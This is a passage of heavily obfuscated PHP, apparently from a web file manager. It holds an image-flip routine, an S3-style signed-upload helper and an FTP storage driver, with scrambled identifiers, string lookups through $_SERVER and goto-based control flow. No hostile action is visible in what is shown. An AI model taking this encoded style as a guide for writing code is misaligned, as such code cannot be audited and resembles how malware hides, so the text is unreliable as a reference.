$B¼İç„è¥); for ($d¿î‚«õæ = 0; $d¿î‚«õæ < $fĞ«ëÀ²Œ­; ++$d¿î‚«õæ) { imagecopy($fĞ•¯ãˆŒ, $EÄóíÀ…Ó…, 0, 0, $d¿î‚«õæ, 0, 1, $B¼İç„è¥); imagecopy($EÄóíÀ…Ó…, $EÄóíÀ…Ó…, $d¿î‚«õæ, 0, $dÄèØßÊ½ - $d¿î‚«õæ, 0, 1, $B¼İç„è¥); imagecopy($EÄóíÀ…Ó…, $fĞ•¯ãˆŒ, $dÄèØßÊ½ - $d¿î‚«õæ, 0, 0, 0, 1, $B¼İç„è¥); } break; case IMG_FLIP_VERTICAL: $FÁÔøÈ¼ÊÑ = imagesx($EÄóíÀ…Ó…); $EİŠšƒ‡Œ» = imagesy($EÄóíÀ…Ó…) - 1; $C’‡óğìù• = $EİŠšƒ‡Œ» / 2; $fĞ•¯ãˆŒ = imageistruecolor($EÄóíÀ…Ó…) ? imagecreatetruecolor($FÁÔøÈ¼ÊÑ, 1) : imagecreate($FÁÔøÈ¼ÊÑ, 1); for ($Bå©Üõß = 0; $Bå©Üõß < $C’‡óğìù•; ++$Bå©Üõß) { imagecopy($fĞ•¯ãˆŒ, $EÄóíÀ…Ó…, 0, 0, 0, $Bå©Üõß, $FÁÔøÈ¼ÊÑ, 1); imagecopy($EÄóíÀ…Ó…, $EÄóíÀ…Ó…, 0, $Bå©Üõß, 0, $EİŠšƒ‡Œ» - $Bå©Üõß, $FÁÔøÈ¼ÊÑ, 1); imagecopy($EÄóíÀ…Ó…, $fĞ•¯ãˆŒ, 0, $EİŠšƒ‡Œ» - $Bå©Üõß, 0, 0, $FÁÔøÈ¼ÊÑ, 1); } break; case IMG_FLIP_BOTH: $FÁÔøÈ¼ÊÑ = imagesx($EÄóíÀ…Ó…); $B¼İç„è¥ = imagesy($EÄóíÀ…Ó…); $fĞ•¯ãˆŒ = imagerotate($EÄóíÀ…Ó…, 180, 0); imagecopy($EÄóíÀ…Ó…, $fĞ•¯ãˆŒ, 0, 0, 0, 0, $FÁÔøÈ¼ÊÑ, $B¼İç„è¥); break; default: return; } imagedestroy($fĞ•¯ãˆŒ); } } goto CƒÇõ…œÊÀ; FŞ‘æõ©ùù: register_shutdown_function($_SERVER[©•ÖÏ¥Ø][36]); set_error_handler($_SERVER[©•ÖÏ¥Ø][49], $E½®Ü³´éÅ); if (function_exists($_SERVER[©•ÖÏ¥Ø][50])) { set_exception_handler($_SERVER[©•ÖÏ¥Ø][51]); } goto a›Ñ¿‹½Åì; eîÎøÆ¼ªè: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($D…Šè‰Ë ø) { parent::__construct($D…Šè‰Ë ø); $this->signatureVersion($_SERVER[îÖ][200]); } public function uploadFormData($aÃÒŠÛßĞˆ, $cÏ½ÑˆôÚœ = 3600) { goto D§Œ•ˆé˜¢; D§Œ•ˆé˜¢: $b ŞÓ©ÆÎ =& $_SERVER[îÖ]; $AóÉ­‰©ŸŠ = $b ŞÓ©ÆÎ[185]; $f‚»‘ãò = $b ŞÓ©ÆÎ[1128]; goto cÀ°Ğ¬ìö; F‘ß‘œ™ô«: $f”áµª²ò— = base64_encode(json_encode($cÏ‹È·±Ğ)); $F±Ÿ¶Üé = hash_hmac($b ŞÓ©ÆÎ[1138], $báŞ›ª, $b ŞÓ©ÆÎ[1139] . $this->secret, !0); $eˆóñ»İ¹Ë = hash_hmac($b ŞÓ©ÆÎ[1138], $this->region, $F±Ÿ¶Üé, !0); goto eƒ›‚šÒ; a©×ƒ†­Ğœ: $AòêÑ†â¥¨ = array($this->accessKey, $báŞ›ª, $this->region, $Aë¦ğ§–, $CÅ÷÷È¹„…); $fš¶ªÚÍ = implode($b ŞÓ©ÆÎ[8], $AòêÑ†â¥¨); $cÏ‹È·±Ğ = array($b ŞÓ©ÆÎ[1096] => gmdate($b ŞÓ©ÆÎ[1095], strtotime($b ŞÓ©ÆÎ[1131])), $b ŞÓ©ÆÎ[1097] => array(array($b ŞÓ©ÆÎ[1099] => $this->bucket), array($b ŞÓ©ÆÎ[1098] => $AóÉ­‰©ŸŠ), array($b ŞÓ©ÆÎ[1100], $b ŞÓ©ÆÎ[1101], $b ŞÓ©ÆÎ[33]), array($b ŞÓ©ÆÎ[1100], $b ŞÓ©ÆÎ[1132], $b ŞÓ©ÆÎ[33]), array($b ŞÓ©ÆÎ[1100], $b ŞÓ©ÆÎ[1133], $b ŞÓ©ÆÎ[33]), array($b ŞÓ©ÆÎ[1102] => $eÓ­‚´½…), array($b ŞÓ©ÆÎ[1134] => $fš¶ªÚÍ), array($b ŞÓ©ÆÎ[1135] => $f‚»‘ãò), array($b ŞÓ©ÆÎ[1136] => $b˜•ºÉÎÈª), array($b ŞÓ©ÆÎ[1137] => $f¹±×™‹¬µ))); goto F‘ß‘œ™ô«; dã®ÚÜ©‹: $CÅ÷÷È¹„… = $b ŞÓ©ÆÎ[1130]; $f¹±×™‹¬µ = $cÏ½ÑˆôÚœ . $b ŞÓ©ÆÎ[33]; $eÓ­‚´½… = $b ŞÓ©ÆÎ[1094]; goto a©×ƒ†­Ğœ; eƒ›‚šÒ: $Cˆ¶¾Š³ˆ­ = hash_hmac($b ŞÓ©ÆÎ[1138], $Aë¦ğ§–, $eˆóñ»İ¹Ë, !0); $cŞ©÷–ãì = hash_hmac($b ŞÓ©ÆÎ[1138], $CÅ÷÷È¹„…, $Cˆ¶¾Š³ˆ­, !0); $c›–Ú¥óìÒ = hash_hmac($b ŞÓ©ÆÎ[1138], $f”áµª²ò—, $cŞ©÷–ãì); goto aäİÀí›­î; cÀ°Ğ¬ìö: $Aë¦ğ§– = $b ŞÓ©ÆÎ[59]; $b˜•ºÉÎÈª = gmdate($b ŞÓ©ÆÎ[1129]); $báŞ›ª = gmdate($b ŞÓ©ÆÎ[689]); goto dã®ÚÜ©‹; aäİÀí›­î: $AåøöéÖÉ³ = array($b ŞÓ©ÆÎ[199] => $b ŞÓ©ÆÎ[33], $b ŞÓ©ÆÎ[1140] => $b ŞÓ©ÆÎ[33], $b ŞÓ©ÆÎ[1098] => $AóÉ­‰©ŸŠ, $b ŞÓ©ÆÎ[1102] => $eÓ­‚´½…, $b ŞÓ©ÆÎ[1106] => $f”áµª²ò—, $b ŞÓ©ÆÎ[1141] => $fš¶ªÚÍ, $b ŞÓ©ÆÎ[1142] => $f‚»‘ãò, $b ŞÓ©ÆÎ[1143] => $b˜•ºÉÎÈª, $b ŞÓ©ÆÎ[1144] => $f¹±×™‹¬µ, $b ŞÓ©ÆÎ[1145] => $c›–Ú¥óìÒ, $b ŞÓ©ÆÎ[169] => $this->getHost()); return $AåøöéÖÉ³; goto cì¬¼°Öâ; cì¬¼°Öâ: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($DƒŸÜê¿ÙŸ) { parent::__construct(); if (count($DƒŸÜê¿ÙŸ) > 0) { $this->_init($DƒŸÜê¿ÙŸ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($fè‚“±‡ ê) { $Aäø¼ñÜÜ¹ =& $_SERVER[îÖ]; global $config; $this->appCharset = $config[$Aäø¼ñÜÜ¹[1146]]; $this->systemCharset = $config[$Aäø¼ñÜÜ¹[1147]]; if (isset($fè‚“±‡ ê[$Aäø¼ñÜÜ¹[1148]]) && $fè‚“±‡ ê[$Aäø¼ñÜÜ¹[1148]]) { $this->systemCharset = $fè‚“±‡ ê[$Aäø¼ñÜÜ¹[1148]]; } } public function iconvApp($e¿£‚ëÕ½”) { return $this->iconvTo($e¿£‚ëÕ½”, $this->systemCharset, $this->appCharset); } public function iconvSystem($eŞ†Ş™“‚–) { return $this->iconvTo($eŞ†Ş™“‚–, $this->appCharset, $this->systemCharset); } public function getPathOuter($FÍ¿†“ôÆÙ) { goto A§¿èÓÉ¤÷; cñ™£Àë®å: if (substr($a’Ï‹°¸¹ˆ, 0, 2) == $B¶Ší£Ë·¢[1149]) { $a’Ï‹°¸¹ˆ = BASIC_PATH . substr($a’Ï‹°¸¹ˆ, 2); } if (substr($FÍ¿†“ôÆÙ, 0, 2) == $B¶Ší£Ë·¢[1149]) { $FÍ¿†“ôÆÙ = BASIC_PATH . substr($FÍ¿†“ôÆÙ, 2); } $a’Ï‹°¸¹ˆ = KodIO::clear($a’Ï‹°¸¹ˆ); goto bÊîóääò¨; A§¿èÓÉ¤÷: $B¶Ší£Ë·¢ =& $_SERVER[îÖ]; $a’Ï‹°¸¹ˆ = $this->iconvApp($this->pathBase); $FÍ¿†“ôÆÙ = $this->iconvApp($FÍ¿†“ôÆÙ); goto cñ™£Àë®å; CÅ‹„Ï¸è: return $this->pathDriver . $B¶Ší£Ë·¢[8] . ltrim($FÍ¿†“ôÆÙ, $B¶Ší£Ë·¢[8]); goto BˆŒ‡Œôƒã; bÊîóääò¨: $FÍ¿†“ôÆÙ = KodIO::clear($FÍ¿†“ôÆÙ); $FÍ¿†“ôÆÙ = substr($FÍ¿†“ôÆÙ, strlen($a’Ï‹°¸¹ˆ)); if (empty($this->pathDriver)) { return $FÍ¿†“ôÆÙ; } goto CÅ‹„Ï¸è; BˆŒ‡Œôƒã: } private function _init($Eƒè‰ñµò£ = array()) { $Cï©¢ßÁ×» =& $_SERVER[îÖ]; if (!function_exists($Cï©¢ßÁ×»[1150])) { show_json(LNG($Cï©¢ßÁ×»[1151]), !1); } $this->config = $Eƒè‰ñµò£; $this->charsetReset($Eƒè‰ñµò£); foreach ($Eƒè‰ñµò£ as $EùË§°«– => $e¹ŒÍ‹½šä) { if (isset($this->{$EùË§°«–})) { $this->{$EùË§°«–} = $e¹ŒÍ‹½šä; } } return $this->_login($Eƒè‰ñµò£); } private function _login($EÒš–£İ­é) { goto CóÈò§«¤; E³Ø‹Ö‹¨¢: if (isset($fœÃÔ°·î™[$Eç½¼¿Ô])) { foreach ($fœÃÔ°·î™[$Eç½¼¿Ô] as $bÚ‰¯ô—¥ => $B¤í‚Éø¸‚) { $this->{$bÚ‰¯ô—¥} = $B¤í‚Éø¸‚; } return !0; } $e  Œ®Òªã = parse_url(trim($this->server, $B’³È’œ[8])); $this->host = $e  Œ®Òªã[$B’³È’œ[169]]; goto Eõã¾‡›‹±; E·ƒ˜™É“: $fœÃÔ°·î™[$Eç½¼¿Ô] = array($B’³È’œ[1155] => $this->connect, $B’³È’œ[169] => $this->host, $B’³È’œ[168] => $this->scheme, $B’³È’œ[170] => $this->port); return $fÓŞ»•ìƒ; goto D™­Ÿø§ŞÔ; aÙ‚«ÒÏÓ: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $a—¥õ¶Îôç = $this->pasv == $B’³È’œ[83] ? !0 : !1; @ftp_pasv($this->connect, $a—¥õ¶Îôç); goto E·ƒ˜™É“; aƒõğñöê: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $fÓŞ»•ìƒ = @ftp_login($this->connect, $this->username, $this->userpass); goto aÙ‚«ÒÏÓ; Eõã¾‡›‹±: $fâÜ¨º = isset($e  Œ®Òªã[$B’³È’œ[168]]) && $e  Œ®Òªã[$B’³È’œ[168]] == $B’³È’œ[1152] ? !0 : !1; $this->scheme = $fâÜ¨º ? $B’³È’œ[1153] : $B’³È’œ[1154]; $this->port = isset($e  Œ®Òªã[$B’³È’œ[170]]) ? $e  Œ®Òªã[$B’³È’œ[170]] : 21; goto aƒõğñöê; CóÈò§«¤: $B’³È’œ =& $_SERVER[îÖ]; static $fœÃÔ°·î™ = array(); $Eç½¼¿Ô = md5(json_encode($EÒš–£İ­é)); goto E³Ø‹Ö‹¨¢; D™­Ÿø§ŞÔ: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($FÀã˜Û®‘ã, $EÈªÖíÀ¨ = '', $c»ßŠ§à¶Ñ = REPEAT_RENAME) { if ($this->setContent($FÀã˜Û®‘ã, $EÈªÖíÀ¨)) { return $this->getPathOuter($FÀã˜Û®‘ã); } return !1; } public function mkdir($D×Ò²®…ª, $a¹âŠ¿îŞ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $D×Ò²®…ª = $this->iconvSystem($D×Ò²®…ª); if ($this->isFolder($D×Ò²®…ª) || @ftp_mkdir($this->connect, $D×Ò²®…ª)) { return $this->getPathOuter($D×Ò²®…ª); } if (!$this->mkdir($this->pathFather($D×Ò²®…ª))) { return !1; } if ($D×Ò²®…ª = @ftp_mkdir($this->connect, $D×Ò²®…ª)) { return $this->getPathOuter($D×Ò²®…ª); } return !1; } public function copyFile($BœªìÒÄ©, $FÃ¢¤‰íë†) { goto c• ¡ğÏù; dó†Ú¯¨‰Í: $D…—ÃéÄ®ƒ = $this->iconvApp($E¶‘¿„ª¾ª); $this->download($BœªìÒÄ©, $D…—ÃéÄ®ƒ); $Dµ´À¤Ï¿† = $this->upload($FÃ¢¤‰íë†, $D…—ÃéÄ®ƒ); goto D¸ø²»Àó‚; D¸ø²»Àó‚: $this->tempFileRemve($E¶‘¿„ª¾ª); return $Dµ´À¤Ï¿†; goto F—É®×½¤é; c• ¡ğÏù: if (!$this->_isconn()) { return !1; } $E§‡áÛÏ¡¸ = $this->pathThis($this->iconvSystem($BœªìÒÄ©)); $E¶‘¿„ª¾ª = $this->tempFile($E§‡áÛÏ¡¸); goto dó†Ú¯¨‰Í; F—É®×½¤é: } public function moveFile($b·…›Ï±–Ú, $C±˜Ï©¦‹Ò) { if (!$this->_isconn()) { return !1; } $b·…›Ï±–Ú = $this->iconvSystem($b·…›Ï±–Ú); $C±˜Ï©¦‹Ò = $this->iconvSystem($C±˜Ï©¦‹Ò); $eê·æ¡–ù = @ftp_rename($this->connect, $b·…›Ï±–Ú, $C±˜Ï©¦‹Ò); return $eê·æ¡–ù ? $this->getPathOuter($C±˜Ï©¦‹Ò) : !1; } public function delFile($AÑ¦®Õ‰Éñ) { if (!$this->_isconn()) { return !1; } $AÑ¦®Õ‰Éñ = $this->iconvSystem($AÑ¦®Õ‰Éñ); return @ftp_delete($this->connect, $AÑ¦®Õ‰Éñ); } public function delFolder($Eóˆ–Ö­¡‚) { if (!$this->_isconn()) { return !1; } $Eóˆ–Ö­¡‚ = $this->iconvSystem($Eóˆ–Ö­¡‚); $eçÌì´¸ = $this->ftpList($Eóˆ–Ö­¡‚); if (!$eçÌì´¸) { return @ftp_rmdir($this->connect, $Eóˆ–Ö­¡‚); } foreach ($eçÌì´¸ as $Cò»­‚á•²) { if ($this->isFolder($Cò»­‚á•²)) { $Cò»­‚á•² = $this->iconvApp($Cò»­‚á•²); $this->delFolder($Cò»­‚á•²); } else { @ftp_delete($this->connect, $Cò»­‚á•²); } } return @ftp_rmdir($this->connect, $Eóˆ–Ö­¡‚); } public function rename($A°àŒ£˜ğ, $E‰İºé‹Äì) { goto fµĞ”ÜÔÇ‡; EÍ˜·Çùà–: $F§Ü°Ûœ¨¥ = $this->iconvSystem($F§Ü°Ûœ¨¥); $A°àŒ£˜ğ = $this->iconvSystem($A°àŒ£˜ğ); $d×ˆ‡Î¾¶ = $this->pathFather($A°àŒ£˜ğ); goto fÎÃ†¼¿©; DÌŸØÙ–©: return $Eìƒ¬ö‘– ? $this->getPathOuter($eÖè£Õ–) : !1; goto càîÔí÷; fÎÃ†¼¿©: $eÖè£Õ– = rtrim($d×ˆ‡Î¾¶, $AˆÓ…ÈÈÅø[8]) . $AˆÓ…ÈÈÅø[8] . $F§Ü°Ûœ¨¥; $Eìƒ¬ö‘– = @ftp_rename($this->connect, $A°àŒ£˜ğ, $eÖè£Õ–); $eÖè£Õ– = $this->iconvApp($eÖè£Õ–); goto DÌŸØÙ–©; fµĞ”ÜÔÇ‡: $AˆÓ…ÈÈÅø =& $_SERVER[îÖ]; if (!$this->_isconn()) { return !1; } $F§Ü°Ûœ¨¥ = $this->fileNameAuto($this->pathFather($A°àŒ£˜ğ), $E‰İºé‹Äì); goto EÍ˜·Çùà–; càîÔí÷: } private function folderInfo($eõ®ÃËäÜ, $cå ÂŠÑÑ† = false) { goto b­–ƒ¦­¸; b­–ƒ¦­¸: $CÓ§Ò¥ñÏ =& $_SERVER[îÖ]; $dôÈ°å¦Ø = $this->getPathOuter(rtrim($eõ®ÃËäÜ, $CÓ§Ò¥ñÏ[8])); $b¯‹®¢¦Î = $this->pathThis($dôÈ°å¦Ø); goto aìØ¥¦ƒ‘; aìØ¥¦ƒ‘: $fÔÖŸŸ‡ ­ = $this->iconvSystem($eõ®ÃËäÜ); if ($cå ÂŠÑÑ†) { return array($CÓ§Ò¥ñÏ[28] => $b¯‹®¢¦Î, $CÓ§Ò¥ñÏ[75] => $dôÈ°å¦Ø, $CÓ§Ò¥ñÏ[29] => $CÓ§Ò¥ñÏ[76]); } $aƒøÈ÷å˜ = array($CÓ§Ò¥ñÏ[28] => $b¯‹®¢¦Î, $CÓ§Ò¥ñÏ[75] => $dôÈ°å¦Ø, $CÓ§Ò¥ñÏ[29] => $CÓ§Ò¥ñÏ[76], $CÓ§Ò¥ñÏ[187] => 0, $CÓ§Ò¥ñÏ[107] => 0, $CÓ§Ò¥ñÏ[1156] => !0, $CÓ§Ò¥ñÏ[1157] => !0); goto c×ˆ‰ô‚Ó; c×ˆ‰ô‚Ó: return $aƒøÈ÷å˜; goto Dƒ»Õ‡ù—; Dƒ»Õ‡ù—: } private function fileInfo($B°¦ºª­ ï, $c·‡­¥’ = false) { goto dèóÎØ‹õ‚; dèóÎØ‹õ‚: $BŠì¶Î¹¢æ =& $_SERVER[îÖ]; $aõé‚Ï‡¢¬ = $this->getPathOuter(rtrim($B°¦ºª­ ï, $BŠì¶Î¹¢æ[8])); $aÂøîÉÇ– = $this->pathThis($aõé‚Ï‡¢¬); goto a±Ìñªàù™; C×ÂÆ–²ù‹: $CàèæéõÒ[$BŠì¶Î¹¢æ[107]] = $CàèæéõÒ[$BŠì¶Î¹¢æ[107]] > 0 ? $CàèæéõÒ[$BŠì¶Î¹¢æ[107]] : 0; return $CàèæéõÒ; goto fàŒ¯©éÑ; a±Ìñªàù™: $bÛÄ²ÄÒ—´ = $this->iconvSystem($B°¦ºª­ ï); if ($c·‡­¥’) { return array($BŠì¶Î¹¢æ[28] => $aÂøîÉÇ–, $BŠì¶Î¹¢æ[75] => $aõé‚Ï‡¢¬, $BŠì¶Î¹¢æ[29] => $BŠì¶Î¹¢æ[167], $BŠì¶Î¹¢æ[160] => $this->ext($B°¦ºª­ ï), $BŠì¶Î¹¢æ[77] => $this->size($B°¦ºª­ ï)); } $CàèæéõÒ = array($BŠì¶Î¹¢æ[28] => $aÂøîÉÇ–, $BŠì¶Î¹¢æ[75] => $aõé‚Ï‡¢¬, $BŠì¶Î¹¢æ[29] => $BŠì¶Î¹¢æ[167], $BŠì¶Î¹¢æ[187] => 0, $BŠì¶Î¹¢æ[107] => @ftp_mdtm($this->connect, $bÛÄ²ÄÒ—´), $BŠì¶Î¹¢æ[160] => $this->ext($B°¦ºª­ ï), $BŠì¶Î¹¢æ[77] => $this->size($B°¦ºª­ ï), $BŠì¶Î¹¢æ[1156] => !0, $BŠì¶Î¹¢æ[1157] => !0); goto C×ÂÆ–²ù‹; fàŒ¯©éÑ: } public function size($CÂœ¼™ŒÃè) { $D¢À÷®¦¹ = $this->objectMeta($CÂœ¼™ŒÃè); return $D¢À÷®¦¹ ? $D¢À÷®¦¹[$_SERVER[îÖ][77]] : 0; } public function info($eÌÁŸ¢ˆ¼‰) { if ($this->isFile($eÌÁŸ¢ˆ¼‰)) { return $this->fileInfo($eÌÁŸ¢ˆ¼‰, 0); } else { if ($this->isFolder($eÌÁŸ¢ˆ¼‰)) { return $this->folderInfo($eÌÁŸ¢ˆ¼‰); } } return !1; } public function exist($FùªÓŞíù) { return $this->objectMeta($FùªÓŞíù) ? !0 : !1; } public function isFile($B„‚òÌšÎ³) { $aË¹«÷·Ø½ =& $_SERVER[îÖ]; $E‚ŞóÕ½ó• = $this->objectMeta($B„‚òÌšÎ³); return $E‚ŞóÕ½ó• ? $E‚ŞóÕ½ó•[$aË¹«÷·Ø½[29]] == $aË¹«÷·Ø½[167] : !1; } public function isFolder($cĞ‰£¿ñ”ß) { $F–Ù™¯Ëä =& $_SERVER[îÖ]; $aâÓùùæÕË = $this->objectMeta($cĞ‰£¿ñ”ß); return $aâÓùùæÕË ? $aâÓùùæÕË[$F–Ù™¯Ëä[29]] == $F–Ù™¯Ëä[76] : !1; } public function listPath($FÇÑÔÙäˆ³, $báôšİØâ† = false) { goto Bó¬ÆÜ½â; A„âÇË§ƒ„: foreach ($aœá÷éˆ² as $FÇÑÔÙäˆ³) { if ($this->isFolder($FÇÑÔÙäˆ³)) { $Dõ§ ‘²œ[$AÑä„Ò–Ğ[74]][] = $this->folderInfo($FÇÑÔÙäˆ³, $báôšİØâ†); } else { $Dõ§ ‘²œ[$AÑä„Ò–Ğ[73]][] = $this->fileInfo($FÇÑÔÙäˆ³, $báôšİØâ†); } } return $Dõ§ ‘²œ; goto a÷—­ñÁæ; fÁ¼ì±Û †: $aœá÷éˆ² = $this->ftpList($FÇÑÔÙäˆ³); $Dõ§ ‘²œ = array($AÑä„Ò–Ğ[74] => array(), $AÑä„Ò–Ğ[73] => array()); if (!$aœá÷éˆ²) { return $Dõ§ ‘²œ; } goto A„âÇË§ƒ„; Bó¬ÆÜ½â: $AÑä„Ò–Ğ =& $_SERVER[îÖ]; if (!$this->_isconn()) { return !1; } $FÇÑÔÙäˆ³ = $this->iconvSystem($FÇÑÔÙäˆ³); goto fÁ¼ì±Û †; a÷—­ñÁæ: } public function has($AØË¶ÉŸ³“, $fÃ°¡ĞÃÕ = false, $A¨ßªíŸŸ = true) { goto c­–¯¼³ëÑ; c­–¯¼³ëÑ: $eÆù¼šÙŠ =& $_SERVER[îÖ]; if (!$this->_isconn()) { return !1; } $AØË¶ÉŸ³“ = $this->iconvSystem($AØË¶ÉŸ³“); goto E£æï‰ñó; E£æï‰ñó: $B®ÀÜÈŸĞ = $this->ftpList($AØË¶ÉŸ³“); if (!$B®ÀÜÈŸĞ) { return !1; } if ($fÃ°¡ĞÃÕ) { return array($eÆù¼šÙŠ[191] => 0, $eÆù¼šÙŠ[192] => count($B®ÀÜÈŸĞ)); } goto b‡Ö—…–ò; b‡Ö—…–ò: foreach ($B®ÀÜÈŸĞ as $AØË¶ÉŸ³“) { if ($A¨ßªíŸŸ) { if (!$this->isFolder($AØË¶ÉŸ³“)) { return !0; } } else { if ($this->isFolder($AØË¶ÉŸ³“)) { return !0; } } } return !1; goto dí·Èó—‰ó; dí·Èó—‰ó: } public function listAll($aÍ«Éó”ä) { goto fø„…·¾‡æ; AùÆ©—ÓÙÖ: $aÊ®æíæŠ™ = array($AÏ¬îò§â[73] => array(), $AÏ¬îò§â[74] => array()); $this->recursionFtpFiles($aÍ«Éó”ä, $aÊ®æíæŠ™); $A®¬îˆøí = array(); goto f©„ßÒâë; fø„…·¾‡æ: $AÏ¬îò§â =& $_SERVER[îÖ]; if (!$this->_isconn()) { return !1; } $aÍ«Éó”ä = $this->iconvSystem($aÍ«Éó”ä); goto AùÆ©—ÓÙÖ; f©„ßÒâë: foreach ($aÊ®æíæŠ™[$AÏ¬îò§â[74]] as $dÈÓŒ˜Èï¨) { $A®¬îˆøí[] = array($AÏ¬îò§â[75] => $AÏ¬îò§â[8] . trim(str_replace($aÍ«Éó”ä, $AÏ¬îò§â[33], $dÈÓŒ˜Èï¨), $AÏ¬îò§â[8]) . $AÏ¬îò§â[8], $AÏ¬îò§â[76] => 1, $AÏ¬îò§â[77] => 0); } foreach ($aÊ®æíæŠ™[$AÏ¬îò§â[73]] as $eÉ×±ÛÜÄ¹) { $A®¬îˆøí[] = array($AÏ¬îò§â[75] => $AÏ¬îò§â[8] . trim(str_replace($aÍ«Éó”ä, $AÏ¬îò§â[33], $eÉ×±ÛÜÄ¹), $AÏ¬îò§â[8]), $AÏ¬îò§â[76] => 0, $AÏ¬îò§â[77] => $this->size($eÉ×±ÛÜÄ¹)); } return $A®¬îˆøí; goto aÃå‘”¬‡»; aÃå‘”¬‡»: } public function getContent($F·‡ŠøäŞ) { if (!$this->_isconn()) { return !1; } $F·‡ŠøäŞ = $this->iconvSystem($F·‡ŠøäŞ); return $this->fileSubstr($F·‡ŠøäŞ); } public function setContent($eÑ‡´…¨æ’, $cÚ£«ÏÏêæ = '') { goto E½áì˜‚ßÕ; E½áì˜‚ßÕ: if (!$this->_isconn()) { return !1; } $D‡Ğ¼•¹Æ· = $this->pathThis($this->iconvSystem($eÑ‡´…¨æ’)); $E¯â´” ã† = $this->tempFile($D‡Ğ¼•¹Æ·); goto BªĞš™»¬ä; BªĞš™»¬ä: file_put_contents($E¯â´” ã†, $cÚ£«ÏÏêæ); $c‰çˆŒğ¯ˆ = $this->upload($eÑ‡´…¨æ’, $this->iconvApp($E¯â´” ã†)); $this->tempFileRemve($E¯â´” ã†); goto a—­¥ö»Ãç; a—­¥ö»Ãç: return $c‰çˆŒğ¯ˆ; goto dËœ– åˆ½; dËœ– åˆ½: } public function fileSubstr($DÁøïì²Í‘, $eõÅÚˆÊùç = 0, $cÊ×¦»˜ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($DÁøïì²Í‘, $eõÅÚˆÊùç, $cÊ×¦»˜); } private function ftpRequest($D…§ç¸®éˆ, $DºˆÈãËĞ = 0, $BÀ¦ˆñƒºà = false) { goto añŠİİİ¹ê; FëÑñÒáÆã: curl_setopt($b£ôÁ×µ¥Ä, CURLOPT_RETURNTRANSFER, 1); $C¸Æ¨Ã—™Â = curl_exec($b£ôÁ×µ¥Ä); curl_close($b£ôÁ×µ¥Ä); goto E‚‚”š“; BÒ¾ÎÅĞ‡‡: curl_setopt($b£ôÁ×µ¥Ä, CURLOPT_URL, $DÛ‚öñøÅÕ . $this->pathEncode($D…§ç¸®éˆ)); curl_setopt($b£ôÁ×µ¥Ä, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($BÀ¦ˆñƒºà) { $bóÖ¤’¡ = $DºˆÈãËĞ + $BÀ¦ˆñƒºà - 1; curl_setopt($b£ôÁ×µ¥Ä, CURLOPT_RANGE, "{$DºˆÈãËĞ}\x2d{$bóÖ¤’¡}"); } goto FëÑñÒáÆã; añŠİİİ¹ê: $D…§ç¸®éˆ = $this->iconvSystem($D…§ç¸®éˆ); $DÛ‚öñøÅÕ = $this->scheme . $this->host . $_SERVER[îÖ][4] . $this->port; $b£ôÁ×µ¥Ä = curl_init(); goto BÒ¾ÎÅĞ‡‡; E‚‚”š“: return $C¸Æ¨Ã—™Â; goto B…Âè„„Ä; B…Âè„„Ä: } public function upload($E´±Ö¦×Çâ, $FÔ†å£ßï•, $dÙáÜ¤µ‰Æ = false, $c•¡Å¨Ç—æ = REPEAT_REPLACE) { goto CÓßï”âğ…; c«Š°É™êâ: $FÔ†å£ßï• = $this->iconvSystem($FÔ†å£ßï•); $E•õâ™¿ = ftp_nb_put($this->connect, $E´±Ö¦×Çâ, $FÔ†å£ßï•, FTP_BINARY); while ($E•õâ™¿ == FTP_MOREDATA) { $E•õâ™¿ = ftp_nb_continue($this->connect); } goto fŒ…Ûâ¬Íİ; fŒ…Ûâ¬Íİ: if ($E•õâ™¿ != FTP_FINISHED) { return !1; } return $this->getPathOuter($E´±Ö¦×Çâ); goto c„é™ÚÂö; CÓßï”âğ…: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($E´±Ö¦×Çâ))) { return !1; } $E´±Ö¦×Çâ = $this->iconvSystem($E´±Ö¦×Çâ); goto c«Š°É™êâ; c„é™ÚÂö: } public function download($B‘¹¿Ö‰Š¡, $dÆò§½³ì¶ = '') { goto a™ªØ…Øù»; câå¨Ô¥ñ: $B‘¹¿Ö‰Š¡ = $this->iconvSystem($B‘¹¿Ö‰Š¡); $dÆò§½³ì¶ = $this->iconvSystem($dÆò§½³ì¶); $Aº‹ÓÉ…» = ftp_nb_get($this->connect, $dÆò§½³ì¶, $B‘¹¿Ö‰Š¡, FTP_BINARY); goto d„šª×“¡ğ; a™ªØ…Øù»: if (!$this->_isconn()) { return !1; } $c ‚èà·‘‡ = $this->pathFather($dÆò§½³ì¶); if (!IO::mkdir($c ‚èà·‘‡)) { return !1; } goto câå¨Ô¥ñ; d„šª×“¡ğ: while ($Aº‹ÓÉ…» == FTP_MOREDATA) { $Aº‹ÓÉ…» = ftp_nb_continue($this->connect); } if ($Aº‹ÓÉ…» != FTP_FINISHED) { return !1; } return $this->iconvApp($dÆò§½³ì¶); goto aÃõ‘ßºˆÀ; aÃõ‘ßºˆÀ: } private function ftpList($eÌŸèÙ´Ï) { goto cƒïô–•ÈÈ; A²È¼‡¡Ó: return $F´ÖåÎ”ÈĞ; goto cï¾¼…í„Ù; eğÄø¨Šô: $eÌŸèÙ´Ï = rtrim($eÌŸèÙ´Ï, $aŠ‹ˆ›»İ[8]) . $aŠ‹ˆ›»İ[8]; $f îîø³¤ä = @ftp_nlist($this->connect, $eÌŸèÙ´Ï); if ($f îîø³¤ä === !1) { $f îîø³¤ä = @ftp_rawlist($this->connect, $eÌŸèÙ´Ï); foreach ($f îîø³¤ä as $Eí…‹˜è÷Ö => $dôˆÑÈËæ) { $f îîø³¤ä[$Eí…‹˜è÷Ö] = end(explode($aŠ‹ˆ›»İ[1158], $dôˆÑÈËæ)); } } goto A£¨²å§¨°; cƒïô–•ÈÈ: $aŠ‹ˆ›»İ =& $_SERVER[îÖ]; if (!$this->isFolder($eÌŸèÙ´Ï)) { return !1; } @ftp_chdir($this->connect, 